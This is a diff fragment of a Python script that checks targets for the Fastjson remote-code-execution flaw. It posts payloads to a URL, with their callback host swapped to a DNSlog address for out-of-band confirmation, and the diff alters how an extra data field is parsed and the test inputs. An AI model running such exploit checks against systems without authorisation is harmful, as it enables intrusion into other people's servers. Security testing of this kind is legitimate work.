@@ -35,7 +35,8 @@ def check_fastjson_rce(url_dir,dnslog,data):
         print("###############################################payload: %d ###############################################"%n)
         payload = payload.replace('localhost',dnslog.strip())%url_dir.split('/')[2]
         res = requests.post(url=url_dir, headers=headers, data=payload, timeout=3, verify=False)
-        if data.strip():
+        re_data = re.findall(r'[{](.*?)[}]', data.strip().strip('{'), re.S)
+        if re_data:
             re_data = re.findall(r'[{](.*?)[}]', data.strip().strip('{'), re.S)
             for re_payload in re_data:
                 if re_payload != "":
@@ -68,8 +69,9 @@ def verify(protol, ip, port,exploit_dir,dnslog,data):
 if __name__ == '__main__':
     ip =  "                 192.168.43.90                                                "
     dnslog = "xxx.xxx.xxx"
-    data = 'a '
+    data = ' '
     print(verify("http",ip, "80 ","  /exploit    ",dnslog,data))
+
 
 
 
